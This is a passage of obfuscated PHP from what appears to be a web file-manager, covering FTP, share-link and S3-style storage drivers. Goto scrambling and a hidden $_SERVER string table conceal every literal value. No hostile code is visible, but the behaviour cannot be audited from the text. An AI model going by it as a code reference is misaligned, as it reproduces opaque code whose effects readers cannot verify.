$b—ÍÑâ±º© = $this->listData($c´ÍÌŒ»Œ); if (!$b—ÍÑâ±º© || $b—ÍÑâ±º©[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][1118]]) { return !1; } return parent::remove($c´ÍÌŒ»Œ); } public function sort($fÄõÍìÑå, $bì†±¡Ã—õ) { return parent::update($fÄõÍìÑå, $bì†±¡Ã—õ); } public function enable($FˆñË•…¹’, $DĞÓÆ“ŠŞ) { return parent::update($FˆñË•…¹’, array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][2040] => $DĞÓÆ“ŠŞ)); } private function initUserOption() { $cŸ¸Šì³Ò =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->optionType = $cŸ¸Šì³Ò[2041]; $this->modelType = $cŸ¸Šì³Ò[2042]; $this->field = array($cŸ¸Šì³Ò[2043], $cŸ¸Šì³Ò[28], $cŸ¸Šì³Ò[195], $cŸ¸Šì³Ò[29], $cŸ¸Šì³Ò[2044], $cŸ¸Šì³Ò[683], $cŸ¸Šì³Ò[189]); } public function userNoticeGet($bŒÓ¤‰¸ = false) { $this->initUserOption(); return parent::listData($bŒÓ¤‰¸, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][385], !0); } public function userNoticeAdd($c‡¤£±«¥) { $a“¾¾êç¥ê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->initUserOption(); $Fâ¨Îˆ–±° = $this->findByKey($a“¾¾êç¥ê[2043], $c‡¤£±«¥[$a“¾¾êç¥ê[385]]); if ($Fâ¨Îˆ–±°) { return !0; } $EÑ³”Ïó˜ƒ = array($a“¾¾êç¥ê[2043] => $c‡¤£±«¥[$a“¾¾êç¥ê[385]], $a“¾¾êç¥ê[28] => $c‡¤£±«¥[$a“¾¾êç¥ê[28]], $a“¾¾êç¥ê[195] => $c‡¤£±«¥[$a“¾¾êç¥ê[195]], $a“¾¾êç¥ê[29] => isset($c‡¤£±«¥[$a“¾¾êç¥ê[29]]) ? $c‡¤£±«¥[$a“¾¾êç¥ê[29]] : 1, $a“¾¾êç¥ê[2044] => isset($c‡¤£±«¥[$a“¾¾êç¥ê[2044]]) ? $c‡¤£±«¥[$a“¾¾êç¥ê[2044]] : 0, $a“¾¾êç¥ê[683] => 0, $a“¾¾êç¥ê[189] => 0); return parent::insert($EÑ³”Ïó˜ƒ); } public function userNoticeEdit($FŠº„œÒÜŠ, $Fô‰ÊÈÎéŠ) { $this->initUserOption(); return parent::update($FŠº„œÒÜŠ, $Fô‰ÊÈÎéŠ); } } goto CÎ¦£„¤ª¸; e‚°ööì†: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($BîÎ¯ÕŸ½Ü) { $this->pathParse = $BîÎ¯ÕŸ½Ü; } protected function infoParse($cÜ‘Óêİà¬, $a°„ÌÉ¼ÔĞ = false) { $aìÙÀÑé =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return Action($aìÙÀÑé[1021])->sharePathInfo($this->pathParse[$aìÙÀÑé[75]], !0, $a°„ÌÉ¼ÔĞ); } public function listPath($F´ğ…¶…ƒ¥, $a©õ¬Ã…Û = false) { $C†çÆî†ï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cãºõ†… = IO::listPath($F´ğ…¶…ƒ¥, $a©õ¬Ã…Û); foreach ($cãºõ†… as $D‚š¹·ù¢² => $fô¨¾ÌÄè) { if (!in_array($D‚š¹·ù¢², array($C†çÆî†ï[73], $C†çÆî†ï[74]))) { continue; } foreach ($fô¨¾ÌÄè as $Bæåšùƒà± => $fÛ¼¸·ö¤) { $fÛ¼¸·ö¤ = Action($C†çÆî†ï[1173])->parsePathChildren($fÛ¼¸·ö¤, array($C†çÆî†ï[405] => $F´ğ…¶…ƒ¥)); $cãºõ†…[$D‚š¹·ù¢²][$Bæåšùƒà±] = Action($C†çÆî†ï[1021])->shareItemInfo($fÛ¼¸·ö¤); } } return $cãºõ†…; } public function listAll($aòäÑÁ™¯Û) { $C¨¢ŞÃˆ¨ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FÄ„¥‡ó = IO::listAll($aòäÑÁ™¯Û); foreach ($FÄ„¥‡ó as &$Fó—æ©ğëè) { $Fó—æ©ğëè = array_merge(IO::info($Fó—æ©ğëè[$C¨¢ŞÃˆ¨[75]]), $Fó—æ©ğëè); $Fó—æ©ğëè[$C¨¢ŞÃˆ¨[84]] = Action($C¨¢ŞÃˆ¨[1021])->shareItemInfo($Fó—æ©ğëè); } unset($Fó—æ©ğëè); return $FÄ„¥‡ó; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($f´”¬»—‡®) { parent::__construct($f´”¬»—‡®); $this->signatureVersion($_SERVER[ó¬â¥‰ÊÔ¤Ç£][210]); } public function uploadFormData($dáÁëõ, $C…œ“—½ùÔ = 3600) { goto eÎ½«Ãİè; Eî®ààÏ›: $F¹ÅÒ×—Î¶ = array($this->accessKey, $fÌË„à¢Î÷, $this->region, $BÀ•Öˆ÷’², $dÎîÍ’Ğ½‡); $DÃ«ÆÈ’ ± = implode($aÅ× Ûš‘¨[8], $F¹ÅÒ×—Î¶); $A¬ö¹œÅé = array($aÅ× Ûš‘¨[1139] => gmdate($aÅ× Ûš‘¨[1138], strtotime($aÅ× Ûš‘¨[1177])), $aÅ× Ûš‘¨[1140] => array(array($aÅ× Ûš‘¨[1142] => $this->bucket), array($aÅ× Ûš‘¨[1141] => $fê«” Óó¾), array($aÅ× Ûš‘¨[1143], $aÅ× Ûš‘¨[1144], $aÅ× Ûš‘¨[33]), array($aÅ× Ûš‘¨[1143], $aÅ× Ûš‘¨[1178], $aÅ× Ûš‘¨[33]), array($aÅ× Ûš‘¨[1143], $aÅ× Ûš‘¨[1179], $aÅ× Ûš‘¨[33]), array($aÅ× Ûš‘¨[1145] => $A”Ì¶ÁÅ¹Ó), array($aÅ× Ûš‘¨[1180] => $DÃ«ÆÈ’ ±), array($aÅ× Ûš‘¨[1181] => $EƒÈ‚äò ), array($aÅ× Ûš‘¨[1182] => $eñÆ¼ªñˆè), array($aÅ× Ûš‘¨[1183] => $CäÂÅš³))); goto FæÅñ¢Ë”; CËî†ØòÌ°: $fÓµöó©í‹ = hash_hmac($aÅ× Ûš‘¨[1184], $BÀ•Öˆ÷’², $Fí˜ƒŒ–ˆÇ, !0); $döÙ¿ªØ’Á = hash_hmac($aÅ× Ûš‘¨[1184], $dÎîÍ’Ğ½‡, $fÓµöó©í‹, !0); $A…ñæÚ÷À¨ = hash_hmac($aÅ× Ûš‘¨[1184], $AÙ˜ÎŠä„À, $döÙ¿ªØ’Á); goto FŸÇ—¿Â¼; FæÅñ¢Ë”: $AÙ˜ÎŠä„À = base64_encode(json_encode($A¬ö¹œÅé)); $f•óøâ‰Êã = hash_hmac($aÅ× Ûš‘¨[1184], $fÌË„à¢Î÷, $aÅ× Ûš‘¨[1185] . $this->secret, !0); $Fí˜ƒŒ–ˆÇ = hash_hmac($aÅ× Ûš‘¨[1184], $this->region, $f•óøâ‰Êã, !0); goto CËî†ØòÌ°; c¿óÈ¾­Á‰: $BÀ•Öˆ÷’² = $aÅ× Ûš‘¨[59]; $eñÆ¼ªñˆè = gmdate($aÅ× Ûš‘¨[1175]); $fÌË„à¢Î÷ = gmdate($aÅ× Ûš‘¨[684]); goto aŠ²‹ª‹–Œ; aŠ²‹ª‹–Œ: $dÎîÍ’Ğ½‡ = $aÅ× Ûš‘¨[1176]; $CäÂÅš³ = $C…œ“—½ùÔ . $aÅ× Ûš‘¨[33]; $A”Ì¶ÁÅ¹Ó = $aÅ× Ûš‘¨[1137]; goto Eî®ààÏ›; eÎ½«Ãİè: $aÅ× Ûš‘¨ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fê«” Óó¾ = $aÅ× Ûš‘¨[191]; $EƒÈ‚äò  = $aÅ× Ûš‘¨[1174]; goto c¿óÈ¾­Á‰; FŸÇ—¿Â¼: $d¯œ›õ‚ÚÖ = array($aÅ× Ûš‘¨[209] => $aÅ× Ûš‘¨[33], $aÅ× Ûš‘¨[1186] => $aÅ× Ûš‘¨[33], $aÅ× Ûš‘¨[1141] => $fê«” Óó¾, $aÅ× Ûš‘¨[1145] => $A”Ì¶ÁÅ¹Ó, $aÅ× Ûš‘¨[1149] => $AÙ˜ÎŠä„À, $aÅ× Ûš‘¨[1187] => $DÃ«ÆÈ’ ±, $aÅ× Ûš‘¨[1188] => $EƒÈ‚äò , $aÅ× Ûš‘¨[1189] => $eñÆ¼ªñˆè, $aÅ× Ûš‘¨[1190] => $CäÂÅš³, $aÅ× Ûš‘¨[1191] => $A…ñæÚ÷À¨, $aÅ× Ûš‘¨[175] => $this->getHost()); return $d¯œ›õ‚ÚÖ; goto CÖ‚äò¬¾©; CÖ‚äò¬¾©: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($EŞŠè¢ãÂ£) { parent::__construct(); if (count($EŞŠè¢ãÂ£) > 0) { $this->_init($EŞŠè¢ãÂ£); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($d©Ä±œ¯ŒÏ) { $EÑø·‘à‚· =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; global $config; $this->appCharset = $config[$EÑø·‘à‚·[1192]]; $this->systemCharset = $config[$EÑø·‘à‚·[1193]]; if (isset($d©Ä±œ¯ŒÏ[$EÑø·‘à‚·[1194]]) && $d©Ä±œ¯ŒÏ[$EÑø·‘à‚·[1194]]) { $this->systemCharset = $d©Ä±œ¯ŒÏ[$EÑø·‘à‚·[1194]]; } } public function iconvApp($Dµ›šìˆñ‹) { return $this->iconvTo($Dµ›šìˆñ‹, $this->systemCharset, $this->appCharset); } public function iconvSystem($eÉ‰°ŸÓ³İ) { return $this->iconvTo($eÉ‰°ŸÓ³İ, $this->appCharset, $this->systemCharset); } public function getPathOuter($A®í†‹¯À´) { goto a´È¿Œ¾Ô…; B¦Øí¤ˆ‡¶: if (substr($F×§ÚëÛ¤Ò, 0, 2) == $bœõàôˆßˆ[1195]) { $F×§ÚëÛ¤Ò = BASIC_PATH . substr($F×§ÚëÛ¤Ò, 2); } if (substr($A®í†‹¯À´, 0, 2) == $bœõàôˆßˆ[1195]) { $A®í†‹¯À´ = BASIC_PATH . substr($A®í†‹¯À´, 2); } $F×§ÚëÛ¤Ò = KodIO::clear($F×§ÚëÛ¤Ò); goto D™æ÷¨ˆÚ; A ØÈ³¡ğÎ: return $this->pathDriver . $bœõàôˆßˆ[8] . ltrim($A®í†‹¯À´, $bœõàôˆßˆ[8]); goto c­ÊïÔİŞ; D™æ÷¨ˆÚ: $A®í†‹¯À´ = KodIO::clear($A®í†‹¯À´); $A®í†‹¯À´ = substr($A®í†‹¯À´, strlen($F×§ÚëÛ¤Ò)); if (empty($this->pathDriver)) { return $A®í†‹¯À´; } goto A ØÈ³¡ğÎ; a´È¿Œ¾Ô…: $bœõàôˆßˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F×§ÚëÛ¤Ò = $this->iconvApp($this->pathBase); $A®í†‹¯À´ = $this->iconvApp($A®í†‹¯À´); goto B¦Øí¤ˆ‡¶; c­ÊïÔİŞ: } private function _init($fŸùÆĞŒÆŞ = array()) { $bÙ¸œ¾ÁÈ… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!function_exists($bÙ¸œ¾ÁÈ…[1196])) { throw new Exception(LNG($bÙ¸œ¾ÁÈ…[1197])); } $this->config = $fŸùÆĞŒÆŞ; $this->charsetReset($fŸùÆĞŒÆŞ); foreach ($fŸùÆĞŒÆŞ as $f‡·ïÁùé¯ => $DŒÕ÷±±é©) { if (isset($this->{$f‡·ïÁùé¯})) { $this->{$f‡·ïÁùé¯} = $DŒÕ÷±±é©; } } return $this->_login($fŸùÆĞŒÆŞ); } private function _login($dÂ˜‹ôÌ“Ç) { goto Eİ÷Üœ‘¶Œ; Fòù‚øª½ø: if (isset($dç£²ÅÓî‚[$C•»Æ˜‡®])) { foreach ($dç£²ÅÓî‚[$C•»Æ˜‡®] as $f†å™ÖˆÄİ => $câ¤Å©ùá÷) { $this->{$f†å™ÖˆÄİ} = $câ¤Å©ùá÷; } return !0; } $bŞÏëç÷Ã = parse_url(trim($this->server, $FÜ¤ùÂ‹“œ[8])); $this->host = $bŞÏëç÷Ã[$FÜ¤ùÂ‹“œ[175]]; goto AÄäé¼¸´ß; e”áĞ“Ë™: $dç£²ÅÓî‚[$C•»Æ˜‡®] = array($FÜ¤ùÂ‹“œ[1201] => $this->connect, $FÜ¤ùÂ‹“œ[175] => $this->host, $FÜ¤ùÂ‹“œ[174] => $this->scheme, $FÜ¤ùÂ‹“œ[176] => $this->port); return $E‰ßµåÒ—; goto C £Ê¡ˆñ©; AÄäé¼¸´ß: $c³Å¶½ = isset($bŞÏëç÷Ã[$FÜ¤ùÂ‹“œ[174]]) && $bŞÏëç÷Ã[$FÜ¤ùÂ‹“œ[174]] == $FÜ¤ùÂ‹“œ[1198] ? !0 : !1; $this->scheme = $c³Å¶½ ? $FÜ¤ùÂ‹“œ[1199] : $FÜ¤ùÂ‹“œ[1200]; $this->port = isset($bŞÏëç÷Ã[$FÜ¤ùÂ‹“œ[176]]) ? $bŞÏëç÷Ã[$FÜ¤ùÂ‹“œ[176]] : 21; goto BœÏÉŠô‘×; BœÏÉŠô‘×: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $E‰ßµåÒ— = @ftp_login($this->connect, $this->username, $this->userpass); goto E”†Ã¡¨Ø«; E”†Ã¡¨Ø«: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $E‰ï©ÅÔ = $this->pasv == $FÜ¤ùÂ‹“œ[86] ? !0 : !1; @ftp_pasv($this->connect, $E‰ï©ÅÔ); goto e”áĞ“Ë™; Eİ÷Üœ‘¶Œ: $FÜ¤ùÂ‹“œ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $dç£²ÅÓî‚ = array(); $C•»Æ˜‡® = md5(json_encode($dÂ˜‹ôÌ“Ç)); goto Fòù‚øª½ø; C £Ê¡ˆñ©: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($aô£ëºçé», $c›“¾ÂßñÔ = '', $A¬œÓÍœƒ™ = REPEAT_RENAME) { if ($this->setContent($aô£ëºçé», $c›“¾ÂßñÔ)) { return $this->getPathOuter($aô£ëºçé»); } return !1; } public function mkdir($aÉ±•ƒ³İï, $f¿ŞáÍæ¥ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $aÉ±•ƒ³İï = $this->iconvSystem($aÉ±•ƒ³İï); if ($this->_isFolder($aÉ±•ƒ³İï) || @ftp_mkdir($this->connect, $aÉ±•ƒ³İï)) { return $this->getPathOuter($aÉ±•ƒ³İï); } if (!$this->mkdir($this->pathFather($aÉ±•ƒ³İï))) { return !1; } if ($aÉ±•ƒ³İï = @ftp_mkdir($this->connect, $aÉ±•ƒ³İï)) { return $this->getPathOuter($aÉ±•ƒ³İï); } return !1; } public function copyFile($fÂÎäŞ¦ì, $bê•·ŒÂ—») { goto AÇ´§¥Ë–â; AÇ´§¥Ë–â: if (!$this->_isconn()) { return !1; } $dãÇµÎ¼Š‡ = $this->pathThis($this->iconvSystem($fÂÎäŞ¦ì)); $FŒ”™ÄÌé¢ = $this->tempFile($dãÇµÎ¼Š‡); goto bà»ƒ„ñ¾×; C‡Ÿ©×êò‘: $this->tempFileRemve($FŒ”™ÄÌé¢); return $dº¹­ÜÊÑ; goto bÜğóÑ•à»; bà»ƒ„ñ¾×: $eÌ‡ÁÄ—°³ = $this->iconvApp($FŒ”™ÄÌé¢); $this->download($fÂÎäŞ¦ì, $eÌ‡ÁÄ—°³); $dº¹­ÜÊÑ = $this->upload($bê•·ŒÂ—», $eÌ‡ÁÄ—°³); goto C‡Ÿ©×êò‘; bÜğóÑ•à»: } public function moveFile($C”Ò†µ‰… , $Fº±ËÛº…) { if (!$this->_isconn()) { return !1; } $C”Ò†µ‰…  = $this->iconvSystem($C”Ò†µ‰… ); $Fº±ËÛº… = $this->iconvSystem($Fº±ËÛº…); $a™å—ŠÓÑœ = @ftp_rename($this->connect, $C”Ò†µ‰… , $Fº±ËÛº…); return $a™å—ŠÓÑœ ? $this->getPathOuter($Fº±ËÛº…) : !1; } public function delFile($E¤¿ªŒÒ»ƒ) { if (!$this->_isconn()) { return !1; } $E¤¿ªŒÒ»ƒ = $this->iconvSystem($E¤¿ªŒÒ»ƒ); return @ftp_delete($this->connect, $E¤¿ªŒÒ»ƒ); } public function delFolder($B¸Üœ£®½¶) { goto DªÉø¬²ñˆ; DªÉø¬²ñˆ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $EùÛù„ìƒ¿ = $fòÓÆÉ’Š­ = array(); goto DÃ‡ÄÈ¾¼; DÃ‡ÄÈ¾¼: $this->fileList($B¸Üœ£®½¶, $EùÛù„ìƒ¿, $fòÓÆÉ’Š­, !0); $this->listItemCache = !0; foreach ($fòÓÆÉ’Š­ as $cáÒÓÕç‡‡) { $D†«¾øÛæÄ = $this->iconvSystem($cáÒÓÕç‡‡[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][28]]); $F¤‰©“¥Ô¹ = @ftp_delete($this->connect, $D†«¾øÛæÄ); if (!$F¤‰©“¥Ô¹) { return !1; } } goto bİ‹ÀÔÜ‡©; bİ‹ÀÔÜ‡©: foreach ($EùÛù„ìƒ¿ as $D†«¾øÛæÄ) { $D†«¾øÛæÄ = $this->iconvSystem($D†«¾øÛæÄ); $F¤‰©“¥Ô¹ = @ftp_rmdir($this->connect, $D†«¾øÛæÄ); if (!$F¤‰©“¥Ô¹) { return !1; } } $B¸Üœ£®½¶ = $this->iconvSystem($B¸Üœ£®½¶); return @ftp_rmdir($this->connect, $B¸Üœ£®½¶); goto d–†ìª²ä; d–†ìª²ä: } public function rename($aí—Ò‹–Æ, $eô±Æ†÷›) { goto bßñÏ®ª…å; fô¯ğ·Õç: $cÖË««êŒä = $this->iconvSystem($cÖË««êŒä); $aí—Ò‹–Æ = $this->iconvSystem($aí—Ò‹–Æ); $f©ÛÜóà = $this->pathFather($aí—Ò‹–Æ); goto eô¿‹ãÛáâ; eô¿‹ãÛáâ: $båÙ´¯ø = rtrim($f©ÛÜóà, $cñæ»Í”ßæ[8]) . $cñæ»Í”ßæ[8] . $cÖË««êŒä; $aÁè“—å = @ftp_rename($this->connect, $aí—Ò‹–Æ, $båÙ´¯ø); $båÙ´¯ø = $this->iconvApp($båÙ´¯ø); goto a¯¸„¢ŸÍâ; bßñÏ®ª…å: $cñæ»Í”ßæ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->_isconn()) { return !1; } $cÖË««êŒä = $this->fileNameAuto($this->pathFather($aí—Ò‹–Æ), $eô±Æ†÷›); goto fô¯ğ·Õç; a¯¸„¢ŸÍâ: return $aÁè“—å ? $this->getPathOuter($båÙ´¯ø) : !1; goto f…Û³‘İ±¨; f…Û³‘İ±¨: } private function folderInfo($d’¯«˜Á·, $F·ˆõĞŒÖŒ = false) { $BàØ½¤õ½Ì =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÒö„‰­ = array($BàØ½¤õ½Ì[28] => $this->pathThis($d’¯«˜Á·), $BàØ½¤õ½Ì[75] => $this->getPathOuter($BàØ½¤õ½Ì[8] . $d’¯«˜Á·), $BàØ½¤õ½Ì[29] => $BàØ½¤õ½Ì[76]); if ($F·ˆõĞŒÖŒ) { return $dÒö„‰­; } $dÒö„‰­[$BàØ½¤õ½Ì[192]] = $dÒö„‰­[$BàØ½¤õ½Ì[83]] = 0; $dÒö„‰­[$BàØ½¤õ½Ì[193]] = $dÒö„‰­[$BàØ½¤õ½Ì[194]] = !0; return $dÒö„‰­; } private function fileInfo($CàÖÑ¸óÀ‰, $c§ÑÁíòÀ = false, $D“òìÈç‚¹ = array()) { goto cµ°Ó‰‹À; dÍĞ„—’ö: $A±¼íö´„è[$dÏÄÒ ×ˆÍ[83]] = @ftp_mdtm($this->connect, $dÜø¬Íğ‰æ); if (empty($D“òìÈç‚¹)) { $D“òìÈç‚¹ = $this->objectMeta($CàÖÑ¸óÀ‰); if (!$D“òìÈç‚¹) { return $A±¼íö´„è; } } $A±¼íö´„è[$dÏÄÒ ×ˆÍ[77]] = $D“òìÈç‚¹[$dÏÄÒ ×ˆÍ[77]]; goto e¢ƒ„î„ë; cµ°Ó‰‹À: $dÏÄÒ ×ˆÍ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A±¼íö´„è = array($dÏÄÒ ×ˆÍ[28] => $this->pathThis($CàÖÑ¸óÀ‰), $dÏÄÒ ×ˆÍ[75] => $this->getPathOuter($dÏÄÒ ×ˆÍ[8] . $CàÖÑ¸óÀ‰), $dÏÄÒ ×ˆÍ[29] => $dÏÄÒ ×ˆÍ[173], $dÏÄÒ ×ˆÍ[77] => isset($D“òìÈç‚¹[$dÏÄÒ ×ˆÍ[77]]) ? $D“òìÈç‚¹[$dÏÄÒ ×ˆÍ[77]] : 0, $dÏÄÒ ×ˆÍ[167] => $this->ext($CàÖÑ¸óÀ‰)); if ($c§ÑÁíòÀ) { return $A±¼íö´„è; } goto dÜÆ«œ£Ñ„; e¢ƒ„î„ë: return $A±¼íö´„è; goto DĞÕÊğ¸ËĞ; dÜÆ«œ£Ñ„: $A±¼íö´„è[$dÏÄÒ ×ˆÍ[192]] = $A±¼íö´„è[$dÏÄÒ ×ˆÍ[83]] = 0; $A±¼íö´„è[$dÏÄÒ ×ˆÍ[193]] = $A±¼íö´„è[$dÏÄÒ ×ˆÍ[194]] = !0; $dÜø¬Íğ‰æ = $this->iconvSystem($CàÖÑ¸óÀ‰); goto dÍĞ„—’ö; DĞÕÊğ¸ËĞ: } public function size($b…ø¥Åáİ) { $Cñî–‰®„” = $this->objectMeta($b…ø¥Åáİ); return $Cñî–‰®„” ? $Cñî–‰®„”[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]] : 0; } public function info($BêÆ„Àöçé) { if ($this->isFile($BêÆ„Àöçé)) { return $this->fileInfo($BêÆ„Àöçé, 0); } else { if ($this->isFolder($BêÆ„Àöçé)) { return $this->folderInfo($BêÆ„Àöçé); } } return !1; } private function fileList($d’œ¯ë¯…Ì, &$cƒ…º’—ŞÏ, &$aÈ–ÒçÇ‡¡, $b¾®³šì‚Õ = false) { goto D™¹‚÷õÛ˜; B®õºøÌ×Š: $C™ËˆíËÛ· = $this->listItemCache === !1 ? !1 : !0; $c‹™¾×®Í‹ = @ftp_rawlist($this->connect, $d’œ¯ë¯…Ì); if (!$c‹™¾×®Í‹) { $c‹™¾×®Í‹ = array(); } goto dõ¼‚²¡Ó·; dõ¼‚²¡Ó·: $F…®›ÍéÄÜ = array($EõŠˆÈ£ˆï[94] => 1, $EõŠˆÈ£ˆï[1202] => 1); foreach ($c‹™¾×®Í‹ as $AÛ‚öß¦‘¾) { goto DÓÆÚÕêÆí; b£øõã¤: if (substr($AÛ‚öß¦‘¾, 0, 1) == $EõŠˆÈ£ˆï[1203]) { $bêÁŞíªŒã[$EõŠˆÈ£ˆï[29]] = $EõŠˆÈ£ˆï[76]; $bêÁŞíªŒã[$EõŠˆÈ£ˆï[77]] = 0; } $b×¦È¨â³ = $bêÁŞíªŒã[$EõŠˆÈ£ˆï[29]] == $EõŠˆÈ£ˆï[76] ? !0 : !1; if ($C™ËˆíËÛ·) { $this->cacheMethod($EõŠˆÈ£ˆï[197], $A…ˆõÄÏêœ, $b×¦È¨â³); $this->cacheMethod($EõŠˆÈ£ˆï[198], $A…ˆõÄÏêœ, $bêÁŞíªŒã); } goto E ˜£òÆ“; Dß£Ê®Ô…‘: if (!$A…ˆõÄÏêœ || isset($F…®›ÍéÄÜ[$A…ˆõÄÏêœ])) { continue; } $A…ˆõÄÏêœ = $this->iconvApp($d’œ¯ë¯…Ì . ltrim($A…ˆõÄÏêœ, $EõŠˆÈ£ˆï[8])); $bêÁŞíªŒã = array($EõŠˆÈ£ˆï[28] => $A…ˆõÄÏêœ, $EõŠˆÈ£ˆï[29] => $EõŠˆÈ£ˆï[173], $EõŠˆÈ£ˆï[77] => $f¦Æ…ã¤Ã[4]); goto b£øõã¤; E ˜£òÆ“: if ($b×¦È¨â³) { $cƒ…º’—ŞÏ[] = $A…ˆõÄÏêœ; if ($b¾®³šì‚Õ) { $this->fileList($A…ˆõÄÏêœ, $cƒ…º’—ŞÏ, $aÈ–ÒçÇ‡¡, $b¾®³šì‚Õ); } continue; } $aÈ–ÒçÇ‡¡[] = $bêÁŞíªŒã; goto C³‡‚ë¹µõ; DÓÆÚÕêÆí: $f¦Æ…ã¤Ã = $this->_listItem($AÛ‚öß¦‘¾); if ($f¦Æ…ã¤Ã[0] == $EõŠˆÈ£ˆï[689]) { continue; } $A…ˆõÄÏêœ = $f¦Æ…ã¤Ã[8]; goto Dß£Ê®Ô…‘; C³‡‚ë¹µõ: } if ($C™ËˆíËÛ·) { $this->cacheMethod($EõŠˆÈ£ˆï[197], $d’œ¯ë¯…Ì, !0); } goto FŠö’ôĞá; F¼Áï¾•¯: @ftp_chdir($this->connect, $EõŠˆÈ£ˆï[8]); $d’œ¯ë¯…Ì = rtrim($d’œ¯ë¯…Ì, $EõŠˆÈ£ˆï[8]) . $EõŠˆÈ£ˆï[8]; check_abort(); goto B®õºøÌ×Š; D™¹‚÷õÛ˜: $EõŠˆÈ£ˆï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d’œ¯ë¯…Ì = $this->iconvSystem($d’œ¯ë¯…Ì); if (!$this->isFolder($d’œ¯ë¯…Ì)) { return !1; } goto F¼Áï¾•¯; FŠö’ôĞá: } private function _listItem($FêèÛÛÈÀò) { if (empty($FêèÛÛÈÀò)) { return array(); } $c¢¼İ˜Ùçß = preg_split($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1204], $FêèÛÛÈÀò); if (count($c¢¼İ˜Ùçß) <= 9) { return $c¢¼İ˜Ùçß; } $c¢¼İ˜Ùçß[8] = trim(substr($FêèÛÛÈÀò, strpos($FêèÛÛÈÀò, $c¢¼İ˜Ùçß[7]) + strlen($c¢¼İ˜Ùçß[7]))); return array_splice($c¢¼İ˜Ùçß, 0, 9); } public function listPath($C¶ŸÒè£äÍ, $a³Œ„²Œ¦‘ = false) { goto E ²ìÚßóƒ; E ²ìÚßóƒ: $bÌ¬—šİ‘“ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->_isconn()) { return !1; } $CìºÉ ¼Ï = $fƒÎ†­àÚé = array(); goto B—ÌÁ½ŒŠ­; B—ÌÁ½ŒŠ­: $this->fileList($C¶ŸÒè£äÍ, $CìºÉ ¼Ï, $fƒÎ†­àÚé); foreach ($CìºÉ ¼Ï as $Dõ‘¾Ñ—ùÏ => $CùË‰ÎÜâ‡) { $CìºÉ ¼Ï[$Dõ‘¾Ñ—ùÏ] = $this->folderInfo($CùË‰ÎÜâ‡, $a³Œ„²Œ¦‘); } foreach ($fƒÎ†­àÚé as $Dõ‘¾Ñ—ùÏ => $CùË‰ÎÜâ‡) { $fƒÎ†­àÚé[$Dõ‘¾Ñ—ùÏ] = $this->fileInfo($CùË‰ÎÜâ‡[$bÌ¬—šİ‘“[28]], $a³Œ„²Œ¦‘, $CùË‰ÎÜâ‡); } goto CßÒ‹‡›«É; CßÒ‹‡›«É: return array($bÌ¬—šİ‘“[74] => $CìºÉ ¼Ï, $bÌ¬—šİ‘“[73] => $fƒÎ†­àÚé); goto d³ã›¬Åñ; d³ã›¬Åñ: } public function has($fÔ¾Æõ¥¼Ù, $dŞÏ°¯ŞÏÎ = false, $eŒ‡Íèøİ = true) { goto A­…¢àÖëÏ; cí¥Œä«ä: $this->fileList($fÔ¾Æõ¥¼Ù, $cÕÛ‚á£î¿, $E‚›àíŸò, $e¯ŸôÕŒÑƒ); if ($dŞÏ°¯ŞÏÎ) { return array($eïÅ“”¼İÅ[201] => count($E‚›àíŸò), $eïÅ“”¼İÅ[202] => count($cÕÛ‚á£î¿)); } if ($eŒ‡Íèøİ) { if (count($E‚›àíŸò)) { return !0; } } else { if (count($cÕÛ‚á£î¿)) { return !0; } } goto Cğò½’™øÒ; Cğò½’™øÒ: return !1; goto añ†µ‡³¬; A­…¢àÖëÏ: $eïÅ“”¼İÅ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cÕÛ‚á£î¿ = $E‚›àíŸò = array(); $e¯ŸôÕŒÑƒ = $dŞÏ°¯ŞÏÎ ? !0 : !1; goto cí¥Œä«ä; añ†µ‡³¬: } public function listAll($Dç‘‰’„ğ) { goto bëïè¦Ä™¬; bÜßñ‘È¹‹: $this->fileList($Dç‘‰’„ğ, $D±‘Ğ­õÛ, $aÊŠ­ä†åß, !0); $cš¹ö‰ñ‹Ú = array(); foreach ($aÊŠ­ä†åß as $bËµ±ì…¶î) { $cš¹ö‰ñ‹Ú[$bËµ±ì…¶î[$dÊÔ¬˜Ÿƒï[28]]] = $bËµ±ì…¶î[$dÊÔ¬˜Ÿƒï[77]]; } goto c±–ÌÍ‰‘¤; c±–ÌÍ‰‘¤: foreach ($D±‘Ğ­õÛ as $bËµ±ì…¶î) { if (is_string($bËµ±ì…¶î)) { $cš¹ö‰ñ‹Ú[$bËµ±ì…¶î] = 0; } } return $this->listAllFiles($Dç‘‰’„ğ, array_keys($cš¹ö‰ñ‹Ú), $cš¹ö‰ñ‹Ú); goto D¢Ä‘ºÒ‚; 